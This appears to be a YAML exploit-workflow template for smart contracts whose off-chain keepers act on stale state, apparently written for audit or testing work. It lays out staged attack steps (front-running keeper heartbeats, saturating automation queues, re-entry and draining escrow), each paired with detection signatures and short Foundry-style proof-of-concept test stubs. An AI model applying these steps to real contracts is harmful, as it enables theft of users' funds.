  description: >-
    Templates an exploit workflow for contracts where off-chain keepers or
    asynchronous executors can observe stale state and trigger privileged
    actions, resulting in a desynchronized state machine.

stages:
  - name: Reconnaissance
    objective: Identify externally triggered state transitions that depend on synchronized keeper input.
    actions:
      - Inspect keeper or automation registry interactions.
      - Measure delay between storage writes and keeper executions.
      - Trace events that imply asynchronous callbacks.
    detection_signatures:
      onchain:
        - event StateSync(uint256 indexed roundId, uint256 timestamp)
        - storage slot toggled by external automation contract
      offchain:
        - keeper RPC logs showing back-pressure or retries
    poc_snippet: |
      // Observe stale state before keeper sync
      vm.roll(block.number + 1);
      assertEq(target.getEpochState(), expectedStaleState);
  - name: Desynchronization Setup
    objective: Force the contract into a forked state visible only to the attacker.
    actions:
      - Front-run keeper heartbeats with crafted mempool transactions.
      - Partial fill queues to exhaust keeper gas budgets.
      - Manipulate stake snapshots referenced by delayed callbacks.
    detection_signatures:
      onchain:
        - mempool bundle saturating automation queue contract
        - partial fills recorded without matching state transition events
      offchain:
        - keeper metrics showing dropped tasks
    poc_snippet: |
      // Saturate automation queue
      for (uint256 i = 0; i < 5; i++) {
          target.enqueueTask(attackerTask(i));
      }
  - name: Exploitation
    objective: Execute privileged transition while the contract still exposes stale invariants.
    actions:
      - Trigger the vulnerable function before the keeper catch-up.
      - Re-enter if asynchronous callback depends on outdated snapshot.
      - Drain escrow while invariants reference stale balances.
    detection_signatures:
      onchain:
        - call to executeEpochTransition with outdated roundId
        - balance mismatch between escrow and accounting modules
      offchain:
        - keeper alert "stale epoch" or "unexpected transition"
    poc_snippet: |
      // Exploit stale state before sync
      target.executeEpochTransition();
      assertGt(address(attacker).balance, initialBalance);
  - name: Post-Exploitation Validation
    objective: Confirm the desync persists long enough to extract measurable value.
    actions:
      - Observe account deltas across modules.
      - Run invariant tests on reconciled state after keeper catch-up.
      - Determine remediation path (pause, force sync).
    detection_signatures:
      onchain:
        - delayed SyncCompleted events
        - discrepancy in accounting totals after exploit
      offchain:
        - keeper dashboards showing abnormal reconciliation times
    poc_snippet: |
      // Validate persistence of state skew
      vm.roll(block.number + 5);
      assertEq(target.pendingSyncCount(), 0);
      assertEq(target.accountingTotal(), target.escrowBalance());
detection_signatures:
  onchain:
    - repetitive executeEpochTransition calls without SyncCompleted
    - automation queue contract hitting gas ceiling
  offchain:
    - keeper telemetry reporting retries > 3 per minute
